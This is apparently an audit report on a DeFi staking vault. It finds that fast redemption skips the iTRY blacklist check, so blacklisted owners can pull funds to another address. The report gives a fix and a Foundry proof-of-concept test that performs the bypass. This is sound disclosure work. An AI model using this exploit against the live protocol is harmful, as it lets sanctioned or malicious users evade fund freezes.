## Title
iTRY Blacklist Bypass via Fast Redemption - Blacklisted iTRY Owners Can Extract Funds Through wiTRY Vault

## Summary
The fast redemption flow in `StakediTryFastRedeem.sol` only enforces the wiTRY blacklist (`FULL_RESTRICTED_STAKER_ROLE`) but does not validate whether the share owner is blacklisted in the underlying iTRY token (`BLACKLISTED_ROLE`). This allows users who are blacklisted in iTRY to bypass the blacklist restriction and extract their funds by redeeming wiTRY shares to a non-blacklisted receiver address.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/token/wiTRY/StakediTryFastRedeem.sol` (function `fastRedeem` lines 57-71, function `_redeemWithFee` lines 138-156) and `src/token/wiTRY/StakediTry.sol` (function `_withdraw` lines 262-278)

**Intended Logic:** According to the protocol invariant "Blacklisted users CANNOT send/receive/mint/burn iTRY tokens in ANY case", users who are blacklisted in iTRY should not be able to access their iTRY funds through any mechanism, including redemption from the wiTRY staking vault.

**Actual Logic:** The fast redemption flow performs two separate blacklist checks:

1. **wiTRY blacklist check** in `StakediTry._withdraw()` - validates that `caller`, `receiver`, and `_owner` do not have `FULL_RESTRICTED_STAKER_ROLE` [1](#0-0) 

2. **iTRY blacklist check** in `iTry._beforeTokenTransfer()` - validates that `msg.sender`, `from`, and `to` do not have `BLACKLISTED_ROLE` when iTRY is transferred from vault to receiver [2](#0-1) 

However, when iTRY is transferred from the vault to the receiver during fast redemption, the transfer parameters are:
- `msg.sender` = StakediTry vault contract (not blacklisted)
- `from` = StakediTry vault contract (not blacklisted)
- `to` = receiver (validated as not blacklisted)

The owner's iTRY blacklist status (`BLACKLISTED_ROLE`) is never checked in either validation step.

**Exploitation Path:**

1. **Initial State**: User deposits iTRY into wiTRY vault, receiving wiTRY shares
2. **Blacklist Event**: User gets blacklisted in iTRY token (granted `BLACKLISTED_ROLE`) but remains non-blacklisted in wiTRY (no `FULL_RESTRICTED_STAKER_ROLE`)
3. **Fast Redemption Preparation**: Admin enables fast redemption [3](#0-2) 

4. **Exploit Execution**: Blacklisted owner calls `fastRedeem(shares, non_blacklisted_receiver, owner_address)`
5. **Bypass Success**: 
   - wiTRY blacklist check passes (owner doesn't have `FULL_RESTRICTED_STAKER_ROLE`)
   - `_redeemWithFee()` burns owner's wiTRY shares and transfers iTRY from vault to receiver [4](#0-3) 
   - iTRY blacklist check passes (vault→receiver transfer, owner not involved)
   - Blacklisted owner successfully extracts iTRY to controlled receiver address

**Security Property Broken:** Violates the critical invariant from README: "Blacklisted users CANNOT send/receive/mint/burn iTRY tokens in ANY case" [5](#0-4) 

## Impact Explanation
- **Affected Assets**: iTRY tokens held in the wiTRY staking vault that belong to users blacklisted in iTRY
- **Damage Severity**: Complete bypass of iTRY blacklist mechanism. Blacklisted users can extract 100% of their staked iTRY (minus fast redemption fees) to any non-blacklisted address they control, defeating the purpose of blacklisting which is typically used for regulatory compliance, security incidents, or sanctions
- **User Impact**: Any user who: (1) staked iTRY before being blacklisted, (2) is blacklisted in iTRY but not in wiTRY, can exploit this to access their funds. The protocol loses the ability to freeze funds of malicious actors or comply with legal/regulatory requirements

## Likelihood Explanation
- **Attacker Profile**: Any user who holds wiTRY shares and is blacklisted in iTRY but not in wiTRY. This includes users blacklisted after staking or during security incidents
- **Preconditions**: 
  - User must have wiTRY shares (staked before or after blacklisting)
  - User must be blacklisted in iTRY (`BLACKLISTED_ROLE`) but NOT in wiTRY (`FULL_RESTRICTED_STAKER_ROLE`)
  - Fast redemption must be enabled by admin
  - Cooldown must be active (ensured by `ensureCooldownOn` modifier)
- **Execution Complexity**: Single transaction calling `fastRedeem()` - trivial to execute
- **Frequency**: Can be exploited once per blacklisted user for their entire wiTRY balance. Since blacklisting is typically rare but critical (regulatory/security events), even a single successful bypass has severe consequences

## Recommendation

Add iTRY blacklist validation in the `_withdraw()` function to check if the owner is blacklisted in the underlying iTRY token:

```solidity
// In src/token/wiTRY/StakediTry.sol, function _withdraw, lines 262-278:

// CURRENT (vulnerable):
function _withdraw(address caller, address receiver, address _owner, uint256 assets, uint256 shares)
    internal
    override
    nonReentrant
    notZero(assets)
    notZero(shares)
{
    if (
        hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)
            || hasRole(FULL_RESTRICTED_STAKER_ROLE, _owner)
    ) {
        revert OperationNotAllowed();
    }

    super._withdraw(caller, receiver, _owner, assets, shares);
    _checkMinShares();
}

// FIXED:
function _withdraw(address caller, address receiver, address _owner, uint256 assets, uint256 shares)
    internal
    override
    nonReentrant
    notZero(assets)
    notZero(shares)
{
    // Check wiTRY blacklist (existing check)
    if (
        hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)
            || hasRole(FULL_RESTRICTED_STAKER_ROLE, _owner)
    ) {
        revert OperationNotAllowed();
    }

    // NEW: Check iTRY blacklist for owner
    // Cast asset() to iTry interface and check BLACKLISTED_ROLE
    IiTry iTryToken = IiTry(asset());
    bytes32 BLACKLISTED_ROLE = keccak256("BLACKLISTED_ROLE");
    if (iTryToken.hasRole(BLACKLISTED_ROLE, _owner)) {
        revert OperationNotAllowed();
    }

    super._withdraw(caller, receiver, _owner, assets, shares);
    _checkMinShares();
}
```

**Alternative mitigation**: Implement automatic synchronization between iTRY and wiTRY blacklists - when a user is blacklisted in iTRY, automatically blacklist them in wiTRY as well. However, this requires cross-contract calls and may have gas/complexity implications.

## Proof of Concept

```solidity
// File: test/Exploit_iTryBlacklistBypass.t.sol
// Run with: forge test --match-test test_BlacklistedOwnerCanFastRedeemToBypassBlacklist -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/token/wiTRY/StakediTryFastRedeem.sol";
import "../src/token/iTRY/iTry.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract Exploit_iTryBlacklistBypass is Test {
    StakediTryFastRedeem public stakediTry;
    iTry public itryToken;
    
    address public admin;
    address public treasury;
    address public rewarder;
    address public blacklistManager;
    address public maliciousUser;
    address public receiverAddress;
    
    bytes32 public constant BLACKLISTED_ROLE = keccak256("BLACKLISTED_ROLE");
    bytes32 public constant BLACKLIST_MANAGER_ROLE = keccak256("BLACKLIST_MANAGER_ROLE");
    
    function setUp() public {
        admin = makeAddr("admin");
        treasury = makeAddr("treasury");
        rewarder = makeAddr("rewarder");
        blacklistManager = makeAddr("blacklistManager");
        maliciousUser = makeAddr("maliciousUser");
        receiverAddress = makeAddr("receiverAddress");
        
        // Deploy iTRY token (using proxy pattern as in production)
        iTry implementation = new iTry();
        bytes memory initData = abi.encodeWithSelector(
            iTry.initialize.selector,
            admin,
            address(this) // temporary minter
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), initData);
        itryToken = iTry(address(proxy));
        
        // Deploy StakediTryFastRedeem
        vm.prank(admin);
        stakediTry = new StakediTryFastRedeem(
            IERC20(address(itryToken)),
            rewarder,
            admin,
            treasury
        );
        
        // Grant roles
        vm.startPrank(admin);
        itryToken.grantRole(BLACKLIST_MANAGER_ROLE, blacklistManager);
        stakediTry.grantRole(stakediTry.BLACKLIST_MANAGER_ROLE(), blacklistManager);
        stakediTry.setFastRedeemEnabled(true);
        stakediTry.setFastRedeemFee(500); // 5% fee
        vm.stopPrank();
        
        // Mint iTRY to malicious user
        itryToken.mint(maliciousUser, 1000e18);
    }
    
    function test_BlacklistedOwnerCanFastRedeemToBypassBlacklist() public {
        // SETUP: Malicious user stakes iTRY into wiTRY
        vm.startPrank(maliciousUser);
        itryToken.approve(address(stakediTry), 1000e18);
        stakediTry.deposit(1000e18, maliciousUser);
        vm.stopPrank();
        
        uint256 shares = stakediTry.balanceOf(maliciousUser);
        assertEq(shares, 1000e18, "User should have wiTRY shares");
        
        // BLACKLIST EVENT: User gets blacklisted in iTRY (but not in wiTRY)
        vm.prank(blacklistManager);
        address[] memory users = new address[](1);
        users[0] = maliciousUser;
        itryToken.addBlacklistAddress(users);
        
        assertTrue(itryToken.hasRole(BLACKLISTED_ROLE, maliciousUser), "User should be blacklisted in iTRY");
        assertFalse(stakediTry.hasRole(stakediTry.FULL_RESTRICTED_STAKER_ROLE(), maliciousUser), "User should NOT be blacklisted in wiTRY");
        
        // VERIFY: Direct iTRY transfer from maliciousUser would fail
        vm.prank(maliciousUser);
        vm.expectRevert();
        itryToken.transfer(receiverAddress, 1e18);
        
        // EXPLOIT: Blacklisted user fast redeems to bypass iTRY blacklist
        vm.prank(maliciousUser);
        uint256 assetsReceived = stakediTry.fastRedeem(shares, receiverAddress, maliciousUser);
        
        // VERIFY: Exploit succeeded - blacklisted user extracted iTRY
        uint256 expectedAssets = 1000e18 * 95 / 100; // 95% after 5% fee
        assertGt(itryToken.balanceOf(receiverAddress), 0, "Receiver should have iTRY");
        assertApproxEqAbs(itryToken.balanceOf(receiverAddress), expectedAssets, 1e18, "Receiver should have ~95% of staked iTRY");
        assertEq(stakediTry.balanceOf(maliciousUser), 0, "User's wiTRY shares should be burned");
        
        console.log("=== EXPLOIT SUCCESSFUL ===");
        console.log("Blacklisted user bypassed iTRY blacklist via fast redemption");
        console.log("iTRY extracted to receiver:", itryToken.balanceOf(receiverAddress));
        console.log("This violates the invariant: 'Blacklisted users CANNOT send/receive/mint/burn iTRY tokens in ANY case'");
    }
}
```

## Notes

**Critical Distinction**: This vulnerability exists because the protocol has TWO separate blacklist systems:
1. **iTRY blacklist** (`BLACKLISTED_ROLE` in iTry.sol) - controls iTRY token transfers
2. **wiTRY blacklist** (`FULL_RESTRICTED_STAKER_ROLE` in StakediTry.sol) - controls wiTRY staking operations

The fast redemption flow only validates the wiTRY blacklist, not the iTRY blacklist, creating a bypass vector.

**Why this differs from the known issue**: The Zellic audit identified that "Blacklisted user can transfer tokens using allowance" - this refers to the iTRY `_beforeTokenTransfer` not checking `msg.sender` in allowance-based transfers. My finding is different: it's about redemption from wiTRY vault where the vault itself acts as an intermediary, and the owner's iTRY blacklist status is never checked at any point in the redemption flow.

**Scope validation**: This issue is in `StakediTryFastRedeem.sol` and `StakediTry.sol`, both listed in scope. The vulnerability is exploitable by unprivileged users and directly violates the documented invariant about blacklist enforcement.

### Citations

**File:** src/token/wiTRY/StakediTry.sol (L269-273)
```text
        if (
            hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)
                || hasRole(FULL_RESTRICTED_STAKER_ROLE, _owner)
        ) {
            revert OperationNotAllowed();
```

**File:** src/token/iTRY/iTry.sol (L190-192)
```text
                !hasRole(BLACKLISTED_ROLE, msg.sender) && !hasRole(BLACKLISTED_ROLE, from)
                    && !hasRole(BLACKLISTED_ROLE, to)
            ) {
```

**File:** src/token/wiTRY/StakediTryFastRedeem.sol (L57-71)
```text
    function fastRedeem(uint256 shares, address receiver, address owner)
        external
        ensureCooldownOn
        ensureFastRedeemEnabled
        returns (uint256 assets)
    {
        if (shares > maxRedeem(owner)) revert ExcessiveRedeemAmount();

        uint256 totalAssets = previewRedeem(shares);
        uint256 feeAssets = _redeemWithFee(shares, totalAssets, receiver, owner);

        emit FastRedeemed(owner, receiver, shares, totalAssets, feeAssets);

        return totalAssets - feeAssets;
    }
```

**File:** src/token/wiTRY/StakediTryFastRedeem.sol (L151-155)
```text
        // Withdraw fee portion to treasury
        _withdraw(_msgSender(), fastRedeemTreasury, owner, feeAssets, feeShares);

        // Withdraw net portion to receiver
        _withdraw(_msgSender(), receiver, owner, netAssets, netShares);
```

**File:** README.md (L124-124)
```markdown
- Blacklisted users cannot send/receive/mint/burn iTry tokens in any case.
```
